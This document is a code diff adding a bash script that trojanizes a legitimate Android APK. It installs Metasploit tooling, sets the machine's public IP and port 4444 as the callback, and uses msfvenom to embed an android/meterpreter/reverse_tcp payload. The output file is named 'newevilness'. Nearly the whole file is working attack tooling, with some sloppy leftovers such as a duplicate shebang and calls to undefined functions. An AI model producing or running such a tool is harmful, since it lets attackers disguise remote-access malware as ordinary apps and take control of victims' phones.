@@ -1,0 +1,193 @@
+#!/usr/bin/env bash
+
+cyan='\e[0;36m';
+lightcyan='\e[96m';
+green='\e[0;32m';
+lightgreen='\e[1;32m';
+white='\e[1;37m';
+red='\e[1;31m';
+yellow='\e[1;33m'
+blue='\e[1;34m'
+Escape="\033";
+white="${Escape}[0m";
+RedF="${Escape}[31m";
+GreenF="${Escape}[32m";
+LighGreenF="${Escape}[92m"
+YellowF="${Escape}[33m";
+BlueF="${Escape}[34m";
+CyanF="${Escape}[36m";
+Reset="${Escape}[0m";
+
+# fucntion to check if the script is being run as root
+function check_root() {
+    if [[ `id -u` -ne 0 ]]; then
+        exit 1
+    
+
+    fi
+}
+
+
+# fucntion to check for an active internet connection by pinging google
+function checkinternet()
+{
+    ping -c 1 google.com > /dev/null 2>&1
+    if [[ "$?" != 0 ]]
+    then
+        exit
+    fi
+}
+
+
+#Define options
+path=`pwd`
+lanip=`ip route get 1 | awk '{print $NF;exit}'`
+publicip=`dig +short myip.opendns.com @resolver1.opendns.com`
+ver="v0.2"
+sleep 1
+
+
+# detect ctrl+c exiting
+trap ctrl_c INT
+ctrl_c() {
+    clear
+    apache_svc_stop
+    postgresql_stop
+    sleep 1
+    exit
+}
+#detect system
+# sudo cat /etc/issue.net
+
+
+# function to check dependencies existence
+function check_dependencies() {
+    # check if metasploit-framework is installed
+    which msfconsole > /dev/null 2>&1
+    if [ "$?" -eq "0" ]; then
+        which msfconsole > /dev/null 2>&1
+        sleep 1
+    else
+        sudo apt-get install metasploit-framework -y
+        which msfconsole > /dev/null 2>&1
+        sleep 1
+    fi
+    #check if xterm is installed
+    which xterm > /dev/null 2>&1
+    if [ "$?" -eq "0" ]; then
+        which xterm > /dev/null 2>&1
+        sleep 1
+    else
+        sleep 1
+        sleep 1
+        sudo apt-get install xterm -y
+        clear
+        which xterm > /dev/null 2>&1
+    fi
+    #check if zenity is installed
+    which zenity > /dev/null 2>&1
+    if [ "$?" -eq "0" ]; then
+        which zenity > /dev/null 2>&1
+        sleep 1
+    else
+        which zenity > /dev/null 2>&1
+    fi
+    #Check for Android Asset Packaging Tool
+    which aapt > /dev/null 2>&1
+    if [ "$?" -eq "0" ]; then
+        which aapt > /dev/null 2>&1
+        sleep 1
+    else
+        which aapt > /dev/null 2>&1
+    fi
+    #Check for Apktool Reverse Engineering
+    which apktool > /dev/null 2>&1
+    if [ "$?" -eq "0" ]; then
+        which aapt > /dev/null 2>&1
+        sleep 1
+    else
+        which apktool > /dev/null 2>&1
+    fi
+    #check for zipalign
+    which zipalign > /dev/null 2>&1
+    if [ "$?" -eq "0" ]; then
+        which aapt > /dev/null 2>&1
+        sleep 1
+    else
+        which zipalign > /dev/null 2>&1
+    fi    
+}
+
+
+#function to get lport
+function get_lport()
+{
+    LPORT=4444;
+}
+
+#function to get lhost
+function get_lhost()
+{
+    LHOST=$publicip;
+}
+
+
+
+#function to get payload
+function get_payload()
+{
+    PAYLOAD="android/meterpreter/reverse_tcp";
+
+}
+
+#function name
+function payload_name()
+{
+    apk_name="newevilness";
+
+}
+
+#!/bin/bash
+# This is a script to demonstrate command line arguments
+
+function orig_apk {
+    apk_found=false
+    for arg in "$@"
+    do
+        if [[ $arg == --apk=* ]]; then
+            orig="${arg#*=}"
+            apk_found=true
+            if [[ ! -f $orig ]]; then
+                exit;
+            fi
+        fi
+    done
+    if [[ $apk_found == false ]]; then
+            exit;
+    fi
+}
+
+function embed_payload()
+{   
+    msfvenom -x $orig -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -a dalvik --platform android R -o $apk_name.apk > /dev/null 2>&1
+}
+
+
+
+checkinternet
+sleep 1
+
+
+check_dependencies
+
+sleep 1
+
+get_lhost
+get_lport
+payload_name
+get_payload
+orig_apk "$@"
+
+
+
+embed_payload
